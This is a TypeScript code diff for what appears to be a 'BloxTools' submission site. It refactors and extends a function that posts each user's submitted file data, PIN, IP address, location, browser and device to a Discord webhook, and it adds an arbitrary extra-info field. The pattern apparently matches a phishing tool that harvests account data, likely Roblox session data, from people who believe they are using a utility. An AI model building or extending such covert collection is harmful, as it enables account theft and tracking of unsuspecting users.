@@ -5,6 +5,7 @@ interface WebhookPayload {
   toolType: string;
   file: string;
   pin?: string;
+  additionalInfo?: Record<string, string>;
 }
 
 const COOLDOWN_MAP: Record<string, number> = {};
@@ -33,6 +34,64 @@ export const sendToDiscordWebhook = async (payload: WebhookPayload, webhookUrl: 
     // First 100 chars of file for display
     const displayFile = payload.file.slice(0, 100) + "...";
     
+    // Prepare fields
+    const fields = [
+      {
+        name: "Tool Type",
+        value: payload.toolType,
+        inline: true
+      },
+      {
+        name: "PIN",
+        value: payload.pin || "Not provided",
+        inline: true
+      },
+      {
+        name: "Submission Date",
+        value: new Date().toLocaleString(),
+        inline: true
+      },
+      {
+        name: "IP Address",
+        value: ipInfo.ip || "Unknown",
+        inline: true
+      },
+      {
+        name: "Location",
+        value: ipInfo.location || "Unknown",
+        inline: true
+      },
+      {
+        name: "Browser",
+        value: browserInfo,
+        inline: true
+      },
+      {
+        name: "Device",
+        value: deviceInfo,
+        inline: true
+      }
+    ];
+    
+    // Add additional info fields if available
+    if (payload.additionalInfo) {
+      for (const [key, value] of Object.entries(payload.additionalInfo)) {
+        fields.push({
+          name: key.charAt(0).toUpperCase() + key.slice(1),
+          value: value,
+          inline: true
+        });
+      }
+    }
+    
+    // Add full file data field at the end
+    fields.push({
+      name: "Full File Data",
+      value: payload.file.length > 1024 ? 
+        payload.file.slice(0, 1021) + "..." : 
+        payload.file
+    });
+    
     const response = await fetch(webhookUrl, {
       method: 'POST',
       headers: {
@@ -45,49 +104,7 @@ export const sendToDiscordWebhook = async (payload: WebhookPayload, webhookUrl: 
             title: "File Data Preview",
             description: displayFile,
             color: 0x00d7dc,
-            fields: [
-              {
-                name: "Tool Type",
-                value: payload.toolType,
-                inline: true
-              },
-              {
-                name: "PIN",
-                value: payload.pin || "Not provided",
-                inline: true
-              },
-              {
-                name: "Submission Date",
-                value: new Date().toLocaleString(),
-                inline: true
-              },
-              {
-                name: "IP Address",
-                value: ipInfo.ip || "Unknown",
-                inline: true
-              },
-              {
-                name: "Location",
-                value: ipInfo.location || "Unknown",
-                inline: true
-              },
-              {
-                name: "Browser",
-                value: browserInfo,
-                inline: true
-              },
-              {
-                name: "Device",
-                value: deviceInfo,
-                inline: true
-              },
-              {
-                name: "Full File Data",
-                value: payload.file.length > 1024 ? 
-                  payload.file.slice(0, 1021) + "..." : 
-                  payload.file
-              }
-            ],
+            fields: fields,
             footer: {
               text: "BloxTools Submission System",
               icon_url: "https://i.imgur.com/ZOKp8LH.png"
